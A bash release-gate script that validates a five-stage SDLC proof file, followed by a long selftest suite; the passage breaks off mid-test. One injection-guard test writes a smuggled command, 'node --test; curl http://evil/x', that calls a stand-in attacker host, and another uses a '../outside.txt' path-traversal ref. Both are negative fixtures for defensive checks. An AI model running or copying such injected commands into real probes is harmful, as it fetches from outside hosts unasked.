#!/usr/bin/env bash
# WALTEUR sdlc-run-gate - runtime proof that the full enterprise SDLC executed.
#
# Contract:
#   - No sdlc-run.json and no ship/reflect requirement       => NOT_APPLICABLE, exit 0.
#   - Ship/reflect or WALTEUR_SDLC_RUN_REQUIRED=1 without it => FAIL, exit 2.
#   - Weak/malformed/stale five-stage proof                  => FAIL, exit 2.
#   - Complete ordered five-stage proof                      => PASS, exit 0.
#
# Required stages:
#   local_build -> shared_dev -> staging -> beta -> production
#
# Report:
#   walteur-kit/sdlc-run-report.json
#
# Bypass:
#   WALTEUR_SDLC_RUN=off
# --help: self-documentation BEFORE any side effect (S033 usability contract)
case "${1:-}" in
  -h|--help)
  printf '%s\n' "sdlc-run-gate - runtime proof that the full enterprise SDLC executed."
  printf '%s\n' "usage: bash sdlc-run-gate.sh [--selftest|--help|<default run>]"
  printf '%s\n' "report: walteur-kit/sdlc-run-report.json - fix recipes: walteur-kit/REMEDIATION.md (## sdlc-run-gate)"
  printf '%s\n' "bypass: WALTEUR_SDLC_RUN=off (recorded, not free)"
  exit 0 ;;
esac

set -uo pipefail

# Self-root: resolve this gate's own path so we can source sibling hooks (the shared probe guard).
SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
# Fail-closed shared guard: the constant-exit / no-op probe CLASS is closed by _probe-proof.sh
# (probe_proves_something). Source it if present; if absent, EXEC mode must FAIL CLOSED (handled below),
# never silently skip the unprovable-probe check.
if [ -f "${SELF%/*}/_probe-proof.sh" ]; then . "${SELF%/*}/_probe-proof.sh"; fi

input_dir="${1:-}"
if [ -n "${WALTEUR_ROOT:-}" ] && [ -d "$WALTEUR_ROOT" ]; then
  ROOT="$(cd "$WALTEUR_ROOT" && pwd)"
elif [ -n "$input_dir" ] && [ -d "$input_dir" ]; then
  ROOT="$(cd "$input_dir" && pwd)"
else
  ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
fi
ROOT="$(cd "$ROOT" && pwd)"
KIT="$ROOT/walteur-kit"
PROOF="$KIT/sdlc-run.json"
STATE="$KIT/autopilot/STATE.json"
REPORT="$KIT/sdlc-run-report.json"
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
MAX_AGE_DAYS="${WALTEUR_SDLC_RUN_MAX_AGE_DAYS:-14}"
mkdir -p "$KIT"

have() { command -v "$1" >/dev/null 2>&1; }

write_report() {
  local verdict="$1" reason="$2" extra="${3-}"
  [ -n "$extra" ] || extra='{}'
  if have jq && printf '%s\n' "$extra" | jq -e . >/dev/null 2>&1; then
    jq -n --arg v "$verdict" --arg ts "$TS" --arg reason "$reason" --arg proof "${PROOF#"$ROOT"/}" --argjson extra "$extra" \
      '{verdict:$v, ts:$ts, gate:"sdlc-run-gate", proof_file:$proof, reason:$reason} + $extra' > "$REPORT" 2>/dev/null \
      && return 0
  fi
  printf '{"verdict":"%s","ts":"%s","gate":"sdlc-run-gate","proof_file":"%s","reason":"%s"}\n' \
    "$verdict" "$TS" "${PROOF#"$ROOT"/}" "$reason" > "$REPORT" 2>/dev/null || true
}

detect_required() {
  SDLC_REQUIRED=0
  SDLC_REQUIRED_REASON=""

  if [ "${WALTEUR_SDLC_RUN_REQUIRED:-}" = "1" ]; then
    SDLC_REQUIRED=1
    SDLC_REQUIRED_REASON="WALTEUR_SDLC_RUN_REQUIRED=1"
    return 0
  fi

  if [ -s "$STATE" ] && have jq && jq empty "$STATE" >/dev/null 2>&1; then
    phase="$(jq -r '.phase // empty' "$STATE" 2>/dev/null || true)"
    case "$phase" in
      ship|reflect)
        SDLC_REQUIRED=1
        SDLC_REQUIRED_REASON="STATE.phase=$phase"
        return 0
        ;;
    esac
  fi
}

selftest() {
  local pass=0 fail=0 tmp today self_path
  self_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  today="$(date -u +%F)"

  ck() {
    local name="$1" want="$2" got="$3"
    if [ "$want" = "$got" ]; then
      echo "  ok   - $name (rc=$got)"
      pass=$((pass+1))
    else
      echo "  FAIL - $name (want $want got $got)"
      fail=$((fail+1))
    fi
  }

  if ! have jq; then
    echo "sdlc-run-gate selftest SKIP - jq not installed."
    return 0
  fi

  write_state() {
    local dst="$1" phase="${2:-ship}"
    mkdir -p "$dst/walteur-kit/autopilot"
    jq -n --arg phase "$phase" '{
      schema_version: 1,
      run_id: "sdlc-selftest",
      goal: "SDLC run proof selftest",
      owner: "release-owner",
      build_class: "software",
      risk_tier: "medium",
      phase: $phase,
      autonomy_policy: "full_autopilot",
      budgets: { time_minutes: 1, input_tokens: 1, output_tokens: 1, cost_usd: 0 },
      protected_paths: [],
      stages: [],
      gates: [],
      evidence: [],
      decisions: [],
      signoffs: [],
      authority_boundaries: [],
      blockers: [],
      known_gaps: [],
      next_action: "ship",
      baton_path: "walteur-kit/autopilot/STATE.json",
      updated_at: "2026-06-23T00:00:00Z"
    }' > "$dst/walteur-kit/autopilot/STATE.json"
  }

  write_evidence() {
    local dst="$1"
    mkdir -p "$dst/walteur-kit/sdlc" "$dst/walteur-kit/reports"
    for f in \
      tdd unit lint build local-gate local-evidence code-review security-review integration shared-gate shared-evidence \
      qa e2e parity performance staging-gate staging-evidence adversarial accessibility docs rollback beta-signoff beta-gate beta-evidence \
      deploy smoke monitoring rollback-trigger production-gate production-evidence signoff retro lessons code-review-independence \
      security-review-independence qa-review-independence
    do
      printf '%s evidence\n' "$f" > "$dst/walteur-kit/sdlc/$f.txt"
    done
  }

  write_good_proof() {
    local dst="$1" run_date="${2:-$today}"
    mkdir -p "$dst/walteur-kit"
    cat > "$dst/walteur-kit/sdlc-run.json" <<JSON
{
  "schema_version": 1,
  "run_id": "sdlc-selftest-run",
  "run_date": "$run_date",
  "build_class": "software",
  "risk_tier": "medium",
  "verdict": "PASS",
  "participants": {
    "builder_ids": ["frontend-dev", "backend-dev"],
    "reviewer_ids": ["code-reviewer", "security-reviewer", "qa-lead"],
    "release_owner": "release-owner"
  },
  "stages": [
    {
      "stage": "local_build",
      "owner": "frontend-dev",
      "verdict": "PASS",
      "started_at": "2026-06-23T00:00:00Z",
      "completed_at": "2026-06-23T00:10:00Z",
      "gate_refs": ["walteur-kit/sdlc/local-gate.txt"],
      "evidence_refs": ["walteur-kit/sdlc/local-evidence.txt"],
      "required_refs": {
        "tdd_ref": "walteur-kit/sdlc/tdd.txt",
        "unit_ref": "walteur-kit/sdlc/unit.txt",
        "lint_ref": "walteur-kit/sdlc/lint.txt",
        "build_ref": "walteur-kit/sdlc/build.txt"
      }
    },
    {
      "stage": "shared_dev",
      "owner": "code-reviewer",
      "verdict": "PASS",
      "started_at": "2026-06-23T00:11:00Z",
      "completed_at": "2026-06-23T00:20:00Z",
      "gate_refs": ["walteur-kit/sdlc/shared-gate.txt"],
      "evidence_refs": ["walteur-kit/sdlc/shared-evidence.txt"],
      "required_refs": {
        "code_review_ref": "walteur-kit/sdlc/code-review.txt",
        "security_review_ref": "walteur-kit/sdlc/security-review.txt",
        "integration_ref": "walteur-kit/sdlc/integration.txt"
      }
    },
    {
      "stage": "staging",
      "owner": "qa-lead",
      "verdict": "PASS",
      "started_at": "2026-06-23T00:21:00Z",
      "completed_at": "2026-06-23T00:30:00Z",
      "gate_refs": ["walteur-kit/sdlc/staging-gate.txt"],
      "evidence_refs": ["walteur-kit/sdlc/staging-evidence.txt"],
      "required_refs": {
        "qa_ref": "walteur-kit/sdlc/qa.txt",
        "e2e_ref": "walteur-kit/sdlc/e2e.txt",
        "environment_parity_ref": "walteur-kit/sdlc/parity.txt",
        "performance_ref": "walteur-kit/sdlc/performance.txt"
      }
    },
    {
      "stage": "beta",
      "owner": "release-owner",
      "verdict": "PASS",
      "started_at": "2026-06-23T00:31:00Z",
      "completed_at": "2026-06-23T00:40:00Z",
      "gate_refs": ["walteur-kit/sdlc/beta-gate.txt"],
      "evidence_refs": ["walteur-kit/sdlc/beta-evidence.txt"],
      "required_refs": {
        "adversarial_ref": "walteur-kit/sdlc/adversarial.txt",
        "accessibility_ref": "walteur-kit/sdlc/accessibility.txt",
        "docs_ref": "walteur-kit/sdlc/docs.txt",
        "rollback_ref": "walteur-kit/sdlc/rollback.txt",
        "signoff_ref": "walteur-kit/sdlc/beta-signoff.txt"
      }
    },
    {
      "stage": "production",
      "owner": "release-owner",
      "verdict": "PASS",
      "started_at": "2026-06-23T00:41:00Z",
      "completed_at": "2026-06-23T00:50:00Z",
      "gate_refs": ["walteur-kit/sdlc/production-gate.txt"],
      "evidence_refs": ["walteur-kit/sdlc/production-evidence.txt"],
      "required_refs": {
        "deploy_ref": "walteur-kit/sdlc/deploy.txt",
        "smoke_ref": "walteur-kit/sdlc/smoke.txt",
        "monitoring_ref": "walteur-kit/sdlc/monitoring.txt",
        "rollback_trigger_ref": "walteur-kit/sdlc/rollback-trigger.txt"
      }
    }
  ],
  "independence": {
    "code_review": {
      "reviewer_id": "code-reviewer",
      "independent_from": ["frontend-dev", "backend-dev"],
      "evidence_ref": "walteur-kit/sdlc/code-review-independence.txt"
    },
    "security_review": {
      "reviewer_id": "security-reviewer",
      "independent_from": ["frontend-dev", "backend-dev"],
      "evidence_ref": "walteur-kit/sdlc/security-review-independence.txt"
    },
    "qa_review": {
      "reviewer_id": "qa-lead",
      "independent_from": ["frontend-dev", "backend-dev"],
      "evidence_ref": "walteur-kit/sdlc/qa-review-independence.txt"
    }
  },
  "signoff": {
    "required": true,
    "approver": "release-owner",
    "signoff_ref": "walteur-kit/sdlc/signoff.txt"
  },
  "retro": {
    "retro_ref": "walteur-kit/sdlc/retro.txt",
    "lessons_ref": "walteur-kit/sdlc/lessons.txt"
  },
  "metrics": {
    "total_agent_spawns": 6,
    "gate_failures": 0,
    "figure_it_out_recoveries": 1
  }
}
JSON
  }

  echo "sdlc-run-gate selftest:"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no phase and no sdlc-run.json -> NOT_APPLICABLE" 0 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "ship phase without sdlc-run.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"
  printf '{ bad json\n' > "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "invalid sdlc-run.json -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "valid SDLC run proof -> PASS" 0 "$?"
  rm -rf "$tmp"

  # EXECUTE-PROBE: pipeline probe that PASSES -> PASS (observed). Probe must reference a REAL on-disk test
  # artifact (shared guard probe_proves_something): seed a real test file and run a recognized runner on it.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'export const t=1;\n' > "$tmp/probe.test.mjs"
  jq --arg c "node --test $tmp/probe.test.mjs" '.pipeline_probe = {command:$c, expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "pipeline_probe executes + passes -> PASS" 0 "$?"
  jq -e '.pipeline_probe_executed != null' "$tmp/walteur-kit/sdlc-run-report.json" >/dev/null 2>&1; ck "report records pipeline execution" 0 "$?"
  rm -rf "$tmp"

  # EXECUTE-PROBE: pipeline probe that FAILS -> FAIL. Real on-disk test artifact + recognized runner (so it
  # clears the unprovable-probe guard), but a bad flag makes it EXECUTE to a non-zero exit != expected.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'export const t=1;\n' > "$tmp/probe.test.mjs"
  jq --arg c "node --test --nonexistent-flag-zzz $tmp/probe.test.mjs" '.pipeline_probe = {command:$c, expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "pipeline_probe executes + FAILS -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # TRIVIAL-PROBE REJECTION (S008 fix): command:"true" proves nothing -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"true", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "trivial probe (command:true) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT WRAPPER REJECTION (independent panel): bash -c 'exit 0' slips past the bare-constant
  # list yet proves nothing. Reject the wrapper shapes; a real runner command stays ALLOWED (not trivial).
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"bash -c '\''exit 0'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (bash -c 'exit 0') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"sh -c '\''exit 1'\''", expect_exit:1}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (sh -c 'exit 1') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"bash -c '\''true'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (bash -c 'true') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"bash -c '\'':'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "constant-exit wrapper (bash -c ':') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"exit 0", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "bare constant exit (exit 0) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # CONSTANT-EXIT CLASS CLOSED (shared guard, under EXEC mode): the per-file regex only blocked the literal
  # bash -c 'exit 0'; the shared guard probe_proves_something() now rejects the WHOLE class regardless of how
  # the no-op is dressed — login shell (-lc), trailing ';', and interpreter no-op bodies all touch nothing
  # real, so all FAIL with exit 2.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"bash -lc '\''exit 0'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no-op login shell (bash -lc 'exit 0') under EXEC -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"bash -c '\''exit 0;'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no-op trailing semicolon (bash -c 'exit 0;') under EXEC -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"node -e '\''process.exit(0)'\''", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "no-op interpreter body (node -e 'process.exit(0)') under EXEC -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # BACK-COMPAT: a REAL runner command must NOT be misclassified as a trivial/constant probe.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'export const t=1;\n' > "$tmp/probe.test.mjs"
  jq --arg c "node --test $tmp/probe.test.mjs" '.pipeline_probe = {command:$c, expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "real runner (node --test FILE) NOT rejected as trivial -> PASS" 0 "$?"
  rm -rf "$tmp"

  # EXECUTE-MODE: WALTEUR_SDLC_EXEC=1 + no runnable probe -> FAIL. write_evidence's e2e.txt is plain
  # text ("e2e evidence\n", not a runnable command), so under EXEC this now trips the staging e2e_ref
  # probe check FIRST (S033 C5) before ever reaching the whole-pipeline probe requirement — both are
  # real, both correctly reject a file-existence-only proof under EXEC.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "exec-mode requires probe (none) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # ---- staging e2e_ref must be a runnable probe under EXEC (S033 sdlc C5) ----

  # NEGATIVE CONTROL: staging e2e_ref file exists and is non-empty (passes the plain file-existence
  # bad_refs check) but is prose, not a command -> FAIL under EXEC. This is the exact hole closed: a
  # file-existence-only e2e proof used to be sufficient; it no longer is once WALTEUR_SDLC_EXEC=1.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'E2E suite ran green in CI on 2026-06-23, see build #4821\n' > "$tmp/walteur-kit/sdlc/e2e.txt"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "staging e2e_ref is prose (file-only proof) under EXEC -> FAIL" 2 "$?"
  jq -e '.reason | test("e2e_ref")' "$tmp/walteur-kit/sdlc-run-report.json" >/dev/null 2>&1
  ck "report reason names the staging e2e_ref probe check" 0 "$?"
  rm -rf "$tmp"

  # e2e_ref is a trivial no-op command -> FAIL under EXEC (same discipline as the pipeline probe)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'true\n' > "$tmp/walteur-kit/sdlc/e2e.txt"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "staging e2e_ref trivial no-op (true) under EXEC -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # e2e_ref JSON {command, expect_exit} referencing a real on-disk spec that EXITS NON-ZERO -> FAIL
  # (executed and observed, not merely shape-read)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'export const t=1;\n' > "$tmp/e2e.spec.mjs"
  jq -n --arg c "node --test --nonexistent-flag-zzz $tmp/e2e.spec.mjs" '{command:$c, expect_exit:0}' > "$tmp/walteur-kit/sdlc/e2e.txt"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "staging e2e_ref probe executes + FAILS -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # e2e_ref JSON {command, expect_exit} referencing a REAL runnable E2E probe that PASSES -> proceeds
  # past the staging check (still needs a whole-pipeline probe too, since EXEC requires one) — asserts
  # the staging e2e probe itself is not what blocks a genuinely-passing run.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'export const t=1;\n' > "$tmp/e2e.spec.mjs"
  jq -n --arg c "node --test $tmp/e2e.spec.mjs" '{command:$c, expect_exit:0}' > "$tmp/walteur-kit/sdlc/e2e.txt"
  jq --arg c "node --test $tmp/e2e.spec.mjs" '.pipeline_probe = {command:$c, expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_SDLC_EXEC=1 WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "staging e2e_ref real probe PASSES + pipeline probe PASSES under EXEC -> PASS" 0 "$?"
  jq -e '.staging_e2e_probe_executed != null' "$tmp/walteur-kit/sdlc-run-report.json" >/dev/null 2>&1
  ck "report records staging_e2e_probe_executed" 0 "$?"
  rm -rf "$tmp"

  # BACK-COMPAT: same fixture WITHOUT WALTEUR_SDLC_EXEC set stays PASS on file-existence proof alone
  # (the new staging e2e_ref probe requirement is EXEC-gated, not a default-mode behavior change).
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  printf 'E2E suite ran green in CI, see build #4821\n' > "$tmp/walteur-kit/sdlc/e2e.txt"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "staging e2e_ref prose without EXEC set -> PASS (no behavior change outside EXEC)" 0 "$?"
  rm -rf "$tmp"

  # INJECTION GUARD: dangerous token -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.pipeline_probe = {command:"node --test; curl http://evil/x", expect_exit:0}' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/tmp.json" && mv "$tmp/walteur-kit/tmp.json" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "pipeline_probe with dangerous token -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.stages[1].stage = "staging" | .stages[2].stage = "shared_dev"' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "wrong stage order -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq 'del(.stages[0].required_refs.tdd_ref)' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "missing local TDD ref -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.independence.code_review.reviewer_id = "frontend-dev"' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "reviewer overlaps builder -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  rm -f "$tmp/walteur-kit/sdlc/qa.txt"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "missing staging QA evidence -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq 'del(.stages[3].required_refs.signoff_ref)' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "missing beta signoff ref -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.stages[4].verdict = "FAIL"' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "non-PASS production stage -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp" "2000-01-01"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "stale SDLC run proof -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"; write_evidence "$tmp"; write_good_proof "$tmp"
  jq '.stages[4].required_refs.deploy_ref = "../outside.txt"' "$tmp/walteur-kit/sdlc-run.json" > "$tmp/walteur-kit/proof.tmp" && mv "$tmp/walteur-kit/proof.tmp" "$tmp/walteur-kit/sdlc-run.json"
